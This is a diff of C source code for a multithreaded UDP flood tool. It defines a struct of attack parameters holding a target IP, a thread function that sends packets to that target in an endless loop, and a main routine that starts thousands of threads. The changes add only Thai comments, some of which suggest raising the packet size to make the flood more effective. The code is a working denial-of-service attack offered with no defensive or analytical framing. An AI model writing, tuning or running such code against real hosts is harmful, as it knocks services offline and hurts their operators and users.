@@ -7,8 +7,8 @@
 #include <sys/socket.h>
 #include <time.h>
 
-#define PACKET_SIZE 1024
-#define MAX_THREADS 10000 
+#define PACKET_SIZE 1024  // ขนาดของแพ็กเกจ (สามารถเพิ่มขนาดได้เพื่อเพิ่มประสิทธิภาพ)
+#define MAX_THREADS 10000 // จำนวนเทรดสูงสุด
 
 struct attack_params {
     char target_ip[16];
@@ -32,7 +32,7 @@ void *udp_flood(void *arg) {
     inet_pton(AF_INET, params->target_ip, &target_addr.sin_addr);
 
     char *packet = malloc(params->packet_size);
-    memset(packet, 0x99, params->packet_size);
+    memset(packet, 0x99, params->packet_size);  // เติมข้อมูลในแพ็กเกจ (สามารถปรับได้)
 
     while (1) {
         sendto(sock, packet, params->packet_size, 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
@@ -65,7 +65,7 @@ int main(int argc, char *argv[]) {
     
     for (int i = 0; i < threads; i++) {
         pthread_create(&thread_pool[i], NULL, udp_flood, &params);
-        usleep(1000); 
+        usleep(1000); // ป้องกัน CPU overload
     }
 
     for (int i = 0; i < threads; i++) {
